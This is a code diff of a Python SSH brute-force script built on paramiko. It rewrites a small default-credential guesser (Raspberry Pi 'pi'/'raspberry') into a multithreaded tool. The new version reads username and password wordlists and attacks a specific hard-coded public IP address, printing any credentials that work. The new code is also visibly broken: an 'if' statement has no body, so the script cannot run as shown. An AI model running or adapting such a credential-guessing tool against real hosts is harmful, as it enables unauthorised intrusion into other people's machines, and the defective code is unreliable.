@@ -1,29 +1,45 @@
-import paramiko, sys, os, socket
-usernames=['pi','username']
-passwords=['raspberry','password','Fuck','1234']
-ipAddress=['1.1.1.1']
-def ssh_connect(host, username, password, code=0):
-    ssh=paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+import paramiko, sys, os, socket, threading, time
+from datetime import datetime
 
-    try:
-        ssh.connect(host,port=22,username=username,password=password)
-    except paramiko.AuthenticationException:
-        code=1
-    except socket.error:
-        code=2
+t1=datetime.now()
+print('Start time',t1)
+usernames=[line.strip() for line in open('usernames.txt').readlines()]
+passwords=[line.strip() for line in open('passwords.txt').readlines()]
+ipAddress=['184.171.153.180']
 
-    ssh.close()
-    return code
-found=False
-for x in range(len(usernames)):
-    for y in range(len(passwords)):
-        if ssh_connect(ipAddress[0], usernames[x], passwords[y])==0:
-            print('connected')
-            found=True
+def bruteforce(start,end,step):
+    found=False
+    for x in range(len(usernames)):
+        for y in range(start,end,step):
+            if found==True:
+            ssh=paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            try:
+                ssh.connect(ipAddress[0],port=22,username=usernames[x],password=passwords[y])
+                ssh.close()
+                print(ipAddress[0],usernames[x],passwords[y])
+                print(datetime.now())
+                found=True
+                break
+            except:
+                pass
+            ssh.close()
+        if found==True:
             break
-        else:
-            print('wrong')
-    if found==True:
-        found=False
-        break
+
+def makeThreads(numThreads,function,argument):
+    try:
+        for num in range(numThreads):
+            threading.Thread(target=function, args=(num,argument,numThreads)).start()
+    except KeyboardInterrupt:
+        sys.exit()
+        
+def threads(numThreads,function,argument):
+    activeThreads=threading.activeCount()
+    makeThreads(numThreads,function,argument)
+    while threading.activeCount()>activeThreads:
+        pass
+
+threads(5,bruteforce,len(passwords))
+print('End time',datetime.now())
+print('Length',datetime.now()-t1)
